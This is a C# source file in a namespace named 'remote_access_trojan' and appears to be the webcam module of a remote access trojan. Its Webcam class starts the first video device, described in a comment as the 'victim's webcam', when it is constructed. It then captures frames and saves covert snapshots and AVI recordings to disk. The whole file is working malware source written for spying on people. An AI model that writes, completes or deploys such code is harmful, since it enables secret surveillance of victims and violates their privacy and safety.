using System;
using System.IO;
using System.Drawing;
using AForge.Video;
using AForge.Video.DirectShow;
using Accord.Video.FFMPEG;

namespace remote_access_trojan
{
    class Webcam
    {
        //variables
        private FilterInfoCollection webcam;                //input devices
        private VideoCaptureDevice camera;                  //what will be used to see
        private Bitmap bit;                                 //used for pictures
        private VideoFileWriter writer;                     //used for recording

        public Webcam()
        {
            webcam = new FilterInfoCollection(FilterCategory.VideoInputDevice);     //gets all video input devices
            camera = new VideoCaptureDevice(webcam[0].MonikerString);               //gets single camer (victim's webcam)
            camera.NewFrame += new NewFrameEventHandler(capture_NewFrame);          //adds frame-by-frame to camera
            camera.Start();                                                         //starts camera
        }

        //cam_NewFram handler
        //clones frame-by-frame from camera
        private void capture_NewFrame(object sender, NewFrameEventArgs eventArgs)
        {
            bit = (Bitmap)eventArgs.Frame.Clone();
        }

        //Takes a screenshot and saves to current directory
        public void TakePicture(int index)
        {
            if (bit != null)
                bit.Save(Path.Combine(Directory.GetCurrentDirectory(), "webcam-pic" + index + ".png"));
        }

        //Starts recording
        public void StartVideo(int index)
        {
            writer = new VideoFileWriter();
            writer.Open(Path.Combine(Directory.GetCurrentDirectory(), "webcam-vid" + index + ".avi"), (int)Math.Round((double)bit.Width, 0), (int)Math.Round((double)bit.Height, 0));
        }
        
        //Stops recording
        public void StopVideo()
        {
            writer.Close();
            StopWebcam();
        }

        //Stops camera
        private void StopWebcam()
        {
            if (camera != null && camera.IsRunning)
                camera.Stop();
        }
    }
}
